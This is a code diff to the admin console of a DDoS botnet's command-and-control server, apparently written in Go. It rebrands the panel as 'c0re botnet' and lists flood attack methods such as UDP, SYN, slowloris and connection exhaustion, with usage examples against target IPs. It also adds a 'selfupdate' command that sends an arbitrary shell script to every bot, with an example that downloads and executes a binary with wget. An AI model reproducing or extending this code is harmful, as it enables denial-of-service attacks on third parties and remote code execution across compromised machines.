@@ -83,28 +83,24 @@ func (this *Admin) Handle() {
 		log.Println(logEntry)
 	}
 	
-	const (
-		cyan    = "\033[1;36m"
-		yellow  = "\033[0;33m"
-		green   = "\033[1;32m"
-		reset   = "\033[0m"
-		border  = cyan + "║"
-		padding = "    " 
-	)
-	
-	banner := []string{
-		cyan + "╔═══════════════════════════════════════════════════════╗",
-		fmt.Sprintf("%s %sWELCOME TO SPOOFED NETWORKS!%s%s %s", 
-			border, green, padding, cyan, "                             ║"),
-		fmt.Sprintf("%s %sType 'help' for commands%s%s %s", 
-			border, yellow, padding, cyan, "                            ║"),
-		cyan + "╚═══════════════════════════════════════════════════════╝",
-		reset,
-	}
-	
-	for _, line := range banner {
-		this.conn.Write([]byte(line + "\r\n"))
-	}
+	banner := "\033[1;36m" +
+		"            .-.\r\n" +
+		"           /   \\\r\n" +
+		"          |  \\033[38;5;51m◉\\033[1;36m  |         .-.  \r\n" +
+		"          |     |        /   \\   .-.\r\n" +
+		"           \\   /        |  \\033[38;5;198m◉\\033[1;36m  | /   \\\r\n" +
+		"         .  `-'  .      |     ||  \\033[38;5;201m●\\033[1;36m  |\r\n" +
+		"        /          \\     \\   / |     |\r\n" +
+		"       |     \\033[38;5;226m☉\\033[1;36m     |  .  `-'   \\   /\r\n" +
+		"        \\          /    /        `-'\r\n" +
+		"         `-..__..-'    |    \\033[38;5;93m●\\033[1;36m    |\r\n" +
+		"                        \\        /\r\n" +
+		"                         `-.__.'\r\n\r\n" +
+		"\033[1;95m          ╔═══════════════════════════════════╗\r\n" +
+		"\033[1;95m          ║  \033[1;97mc0re botnet + whyfucked  \033[1;95m║\r\n" +
+		"\033[1;95m          ╚═══════════════════════════════════╝\033[0m\r\n\r\n"
+
+	this.conn.Write([]byte(banner))
 	go func() {
 		i := 0
 		for {
@@ -174,13 +170,18 @@ func (this *Admin) Handle() {
 		if cmd == "methods" {
 			this.conn.Write([]byte("\033[2J\033[1H"))
 			this.conn.Write([]byte("┌──────────────────────────────────────────────────────────────┐\r\n"))
-			this.conn.Write([]byte("│        spoofed network - methods                             │\r\n"))
+			this.conn.Write([]byte("│        c0re botnet - attack methods                          │\r\n"))
 			this.conn.Write([]byte("├────── l4 udp ────────────────────────────────────────────────┤\r\n"))
-			this.conn.Write([]byte("│ udp, raw, nudp, udphex, cudp                                 │\r\n"))
+			this.conn.Write([]byte("│ udp, raw, nudp, udphex, cudp, slowudp, frag                  │\r\n"))
 			this.conn.Write([]byte("├────── l4 tcp ────────────────────────────────────────────────┤\r\n"))
 			this.conn.Write([]byte("│ tcp, ack, syn, xmas, bypass, handshake, std, hex, stdhex     │\r\n"))
+			this.conn.Write([]byte("│ slowloris, rsmedia, ovhtcp, tcp_handshake, conn_exhaust      │\r\n"))
+			this.conn.Write([]byte("├────── special ───────────────────────────────────────────────┤\r\n"))
+			this.conn.Write([]byte("│ socket - powerful legitimate tcp (full handshake + clean)    │\r\n"))
 			this.conn.Write([]byte("├────── how to use ────────────────────────────────────────────┤\r\n"))
 			this.conn.Write([]byte("│ ex: nudp 1.2.3.4 120 port=666                                │\r\n"))
+			this.conn.Write([]byte("│ ex: slowloris 1.2.3.4 300 port=80                            │\r\n"))
+			this.conn.Write([]byte("│ ex: socket 1.2.3.4 120 port=80 threads=64 size=1024          │\r\n"))
 			this.conn.Write([]byte("└──────────────────────────────────────────────────────────────┘\r\n"))
 			continue
 		}
@@ -249,7 +250,8 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15madminadmin    Add new admin           \x1b[38;5;208m│\r\n"))
 			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15madminremove   Remove user             \x1b[38;5;208m│\r\n"))
 			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15madminlogs     Clear attack logs       \x1b[38;5;208m│\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mcount        Show bot count          \x1b[38;5;208m│\r\n"))
+			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mselfupdate    Execute bash script     \x1b[38;5;208m│\r\n"))
+			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mcount         Show bot count          \x1b[38;5;208m│\r\n"))
 			this.conn.Write([]byte("\x1b[38;5;208m└──────────────────────────────────────────────┘\r\n"))
 			continue
 		}
@@ -422,6 +424,37 @@ func (this *Admin) Handle() {
 			continue
 
 		} 
+
+		if userInfo.admin == 1 && strings.HasPrefix(cmd, "selfupdate ") {
+			parts := strings.SplitN(cmd, " ", 2)
+			if len(parts) < 2 {
+				this.conn.Write([]byte("\x1b[1;31mUsage: selfupdate <bash_script>\r\n"))
+				this.conn.Write([]byte("\x1b[1;33mExample: selfupdate cd /tmp && wget http://example.com/bot && chmod +x bot && ./bot\r\n"))
+				continue
+			}
+			
+			script := parts[1]
+			if len(script) > 4096 {
+				this.conn.Write([]byte("\x1b[1;31mScript too long (max 4096 bytes)\r\n"))
+				continue
+			}
+
+			buf := make([]byte, 0, len(script)+10)
+			buf = append(buf, 0x00, 0x00)
+			buf = append(buf, 0x01)
+			scriptLen := uint16(len(script))
+			buf = append(buf, byte(scriptLen>>8), byte(scriptLen&0xFF))
+			buf = append(buf, []byte(script)...)
+			
+			totalLen := uint16(len(buf) - 2)
+			buf[0] = byte(totalLen >> 8)
+			buf[1] = byte(totalLen & 0xFF)
+
+			clientList.QueueBuf(buf, -1, "")
+			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32mSelfupdate command sent to all bots (%d bytes)\r\n", len(script))))
+			continue
+		}
+
 		if cmd[0] == '-' {
 			countSplit := strings.SplitN(cmd, " ", 2)
 			count := countSplit[0][1:]
